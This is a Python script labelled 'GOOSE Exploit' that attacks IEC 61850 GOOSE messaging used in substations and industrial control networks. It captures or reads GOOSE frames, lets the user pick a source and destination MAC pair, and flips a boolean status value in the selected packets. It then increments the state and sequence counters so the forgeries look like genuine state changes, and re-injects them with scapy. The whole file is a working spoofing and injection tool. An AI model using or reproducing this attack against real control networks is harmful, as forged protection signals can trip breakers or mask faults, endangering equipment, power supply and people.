import os, sys, datetime, struct, time, argparse, pyshark, inspect
import numpy as np
import random
from struct import *
from time import sleep
from copy import deepcopy
from warnings import filterwarnings
filterwarnings("ignore")

from pyasn1.codec.ber import decoder, encoder
from pyasn1.type import char, tag, univ
from scapy.layers.l2 import Ether, Dot1Q
from scapy.compat import raw
from scapy.utils import hexdump, wrpcap
from scapy.all import rdpcap, sendp

networkInterface = "eth1"
filter_string = "ether proto 0x88B8 and len <= 200"
GOOSE_TYPE = 0x88b8

currentdir = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
parentdir = os.path.dirname(currentdir)
sys.path.insert(0, parentdir)

from goose.goose import GOOSE, GOOSEPDU
from goose.goose_pdu import AllData, Data, IECGoosePDU, UtcTime

if len(sys.argv) < 2:
    print('[-] For help menu, use -h')
    sys.exit(1)

less_indent_formatter = lambda prog: argparse.RawTextHelpFormatter(prog, max_help_position=8)

parser = argparse.ArgumentParser(description='GOOSE Exploit.', formatter_class=less_indent_formatter, usage='python3 %(prog)s [options]')
parser.add_argument('--pcapfile', help='Name of the PCAP file to process.')
parser.add_argument('--livecapture', action='store_true', help='Start the live capture. (default: %(default)s)')
parser.add_argument('--output', help="""Name of the output file (should be with .pcap extension)
Example: 
----------
    python3 %(prog)s --livecapture --output <filename>
""")
args = parser.parse_args()

# Convert the time into 64-bits or 8-bytes form
UTC = 1  # 0: local time 1: UTC Time
def curTime64Bits(utc=False):
    if UTC:
        curTime = time.mktime(datetime.datetime.utcnow().timetuple())
    else:
        curTime = time.mktime(datetime.datetime.now().timetuple())
    curTimeInt = int(curTime)
    curTimeInt64 = (curTimeInt << 32)
    curTimeInt64Str = curTimeInt64.to_bytes(8, 'big')
    return curTimeInt64Str

def goose_check(packet):
    isGoose = False
    if packet.haslayer('Dot1Q'):
        if packet['Dot1Q'].type == GOOSE_TYPE:
            isGoose = True
    if packet.haslayer('Ether'):
        if packet['Ether'].type == GOOSE_TYPE:
            isGoose = True
    return isGoose

def gooseASN1_DataPrint(data):
    print('\n\n')
    for field in list(IECGoosePDU()):
        if not data[field].hasValue():
            continue
        if type(data[field]) == char.VisibleString:
            print('%s: %s' % (field, str(data[field])))
            continue
        if type(data[field]) == univ.Integer:
            print('%s: %s' % (field, int(data[field])))
            continue
        if type(data[field]) == UtcTime:
            print('%s: %s' % (field, datetime.datetime.fromtimestamp(int.from_bytes(bytearray(data[field])[:4], 'big')).strftime('%Y-%m-%d %H:%M:%S')))
            continue
        if type(data[field]) == univ.Boolean:
            print('%s: %s' % (field, str(data[field])))
            continue
        if type(data[field]) == AllData:
            print('%s' % (field))
            for field in data.getComponentByName('allData'):
                for value in field.values():
                    print('    %s' % (value))
            continue
        if type(data[field]) == univ.OctetString:
            print('%s: %s' % (field, str(data[field])))
            continue

def gooseAllData_decode(encoded_data):
    g = IECGoosePDU().subtype(
        implicitTag=tag.Tag(
            tag.tagClassApplication,
            tag.tagFormatConstructed,
            1
        )
    )
    decoded_data, unprocessed_trail = decoder.decode(
        encoded_data,
        asn1Spec=g
    )
    return decoded_data

def filter_packets(pkt, src_mac, dst_mac):
    if pkt.haslayer(Ether):
        return pkt[Ether].src == src_mac and pkt[Ether].dst == dst_mac
    return False

if args.pcapfile:
    packets = rdpcap(args.pcapfile)
    print("\n[+] Reading pcap file... ")
    sleep(1)

if args.livecapture:
    try:
        print(f"[+] Listening on {networkInterface}")
        sleep(2)
        print("[+] YOU SHOULD HAVE SUDO PERMISSIONS TO DO THIS")
        count = int(input('How many packets do you want to capture?: '))
        print("[+] Capturing packets...")
        captureLive = pyshark.LiveCapture(
            interface=networkInterface,
            bpf_filter=filter_string,
            output_file=args.output
        )
        captureLive.sniff(packet_count=count)
        captureLive.close()
        print("[+] Capturing done..")
        print("[+] Using the pcap file just captured..")
        packets = rdpcap(args.output)
    except KeyboardInterrupt:
        print('\n[-] Exiting')
        sys.exit(1)

print("[+] Parsing GOOSE header and GOOSE PDU header")
sleep(1)
print("[+] Decoding the GOOSE PDU header")
sleep(1)

datSetList = []
g_packets = []  # To store goose packets
unique_addresses = set()  # To store unique (source, destination) tuples

for packet in packets:
    if goose_check(packet):
        g_packets.append(packet)
        data = GOOSE(packet.load)
        goose_pdu = data[GOOSEPDU].original
        goose_decoded = gooseAllData_decode(goose_pdu)
        unique_addresses.add((packet[Ether].src, packet[Ether].dst))
        datSetList.append(str(goose_decoded['datSet']))

perm = input("Do you want to print a sample packet?[Y/N]: ")
mod_g_packets = g_packets[0]
try:
    if perm in ['y', 'Y']:
        print("[+] Printing the packet details...\n")
        sleep(2)
        for i in mod_g_packets:
            d = GOOSE(i.load)
            pdu = d[GOOSEPDU].original
            decode = gooseAllData_decode(pdu)
            gooseASN1_DataPrint(decode)
    elif perm in ['n', 'N']:
        print("Okay, nvm!\n")
    else:
        print('Invalid Input\n')
except KeyboardInterrupt:
    print('[-] Exiting')

unique_addresses_list = list(unique_addresses)
print("\n[+] Scanning for unique source-destination connections...")
sleep(2)
print("Unique source and destination MAC addresses:")
for src, dst in unique_addresses_list:
    print(f"Source: {src} --> Destination: {dst}")

print('\n')
print(f"Select the destination you want to target in the range [1 to {len(unique_addresses_list)}]: ")
target = int(input("Choose the index:  "))
print('\n')
sleep(1)

if 1 <= target <= len(unique_addresses_list):
    src, dst = unique_addresses_list[target - 1]
    print(f"Selected source MAC address: {src}")
    print(f"Selected destination MAC address: {dst}")
    print('\n')
else:
    print("Invalid input!")
    exit(1)

filterd_g_packets = []
for p in g_packets:
    if filter_packets(p, src, dst):
        filterd_g_packets.append(p)

n = int(input(("How many packets you want to manipulate: ")))
print(f"[+] Select the packets you want to manipulate in the range of 0 to {len(filterd_g_packets)}.")
try:
    packet_nos = list(map(int, input("Enter multiple packet numbers separated by space: ").split()))
except KeyboardInterrupt:
    print('[-] Exiting')

true_value = Data()
true_value.setComponentByName('boolean', univ.Boolean(True))
false_value = Data()
false_value.setComponentByName('boolean', univ.Boolean(False))

mod_packets = [filterd_g_packets[packet_no].copy() for packet_no in packet_nos]

for mod_packet in mod_packets:
    mod_packet_load_start_goose = mod_packet.load[:8]
    mod_packet_load_end_alldata = mod_packet.load[-6:]

    mod_data = GOOSE(mod_packet.load)
    mod_pdu = mod_data[GOOSEPDU].original
    mod_pdu_decode = gooseAllData_decode(mod_pdu)

    tmpSQNUM = mod_pdu_decode.getComponentByName('sqNum')
    tmpSTNUM = mod_pdu_decode.getComponentByName('stNum')

    value = 0

    if mod_pdu_decode['allData'].getComponentByPosition(value).getComponentByName('boolean') == univ.Boolean(True):
        mod_pdu_decode['allData'].getComponentByPosition(value).setComponentByName('boolean', univ.Boolean(False))
    else:
        mod_pdu_decode['allData'].getComponentByPosition(value).setComponentByName('boolean', univ.Boolean(True))

    tmpSTNUM += 1
    tmpSQNUM += 1

    mod_pdu_decode.setComponentByName('stNum', tmpSTNUM)
    mod_pdu_decode.setComponentByName('sqNum', tmpSQNUM)

    mod_pdu_encoded = encoder.encode(mod_pdu_decode)
    mod_packet.load = mod_packet_load_start_goose + mod_pdu_encoded + mod_packet_load_end_alldata

print("[+] Sending modified packets...")
for mod_packet in mod_packets:
    sendp(mod_packet, iface=networkInterface)
print("[+] Packets sent successfully.")
